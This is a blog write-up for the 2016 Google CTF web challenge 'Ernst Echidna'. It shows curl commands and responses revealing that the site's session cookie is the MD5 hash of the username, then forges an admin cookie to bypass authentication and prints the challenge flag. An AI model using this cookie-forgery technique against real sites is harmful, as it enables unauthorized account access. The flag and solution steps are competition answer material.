---
layout: post
redirect_from:
  - /writeup/ctf/2016/google-ctf-2016-ernst-echidna/
  - /blog/2016/05/02/google-ctf-2016-ernst-echidna/
date: 2016-05-02T02:33:12+09:00
tags: [ "ctf", "web", "writeup", "google-ctf" ]
"target_url": [ "https://capturetheflag.withgoogle.com/challenges/" ]
---

# Google Capture The Flag 2016: Ernst Echidna

Follow the hint in the problem statement, you can know there is a directory `/admin`. And it seems that check the user by the cookie.

``` sh
$ curl --insecure https://ernst-echidna.ctfcompetition.com/robots.txt
Disallow: /admin
```

When you do register, a cookie is baked.

``` sh
$ curl --insecure -D- https://ernst-echidna.ctfcompetition.com/register -F username=hoge -F password=fuga
HTTP/1.1 100 Continue

HTTP/1.1 302 Found
Location: /welcome
Content-Type: text/html; charset=utf-8
Date: Sun, 01 May 2016 06:27:54 GMT
Server: Google Frontend
Content-Length: 0
Set-Cookie: md5-hash=ea703e7aa1efda0064eaa507d9e8ab7e; Path=/
Alt-Svc: quic=":443"; ma=2592000; v="33,32,31,30,29,28,27,26,25"
```

And it is matchs with the username.

``` sh
$ echo -n hoge | md5sum
ea703e7aa1efda0064eaa507d9e8ab7e  -
```

So you should md5sum the string `admin` and throw it.

``` sh
$ echo -n admin | md5sum
21232f297a57a5a743894a0e4a801fc3  -

$ curl --insecure -D- https://ernst-echidna.ctfcompetition.com/admin --cookie md5-hash=21232f297a57a5a743894a0e4a801fc3
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Date: Sun, 01 May 2016 06:28:45 GMT
Server: Google Frontend
Cache-Control: private
Alt-Svc: quic=":443"; ma=2592000; v="33,32,31,30,29,28,27,26,25"
Accept-Ranges: none
Transfer-Encoding: chunked

<html>
  <head>
   <meta charset="utf-8">
   <title>gloomy-scorpion</title>
   <link rel="stylesheet" href="/static/bootstrap.min.css" media="screen">
  </head>
  <body>
    <div class="container">
      <h1>The authentication server says..</h1>
      <p>Congratulations, your token is &#39;CTF{renaming-a-bunch-of-levels-sure-is-annoying}&#39;</p>
    </div>
  </body>
</html>
```
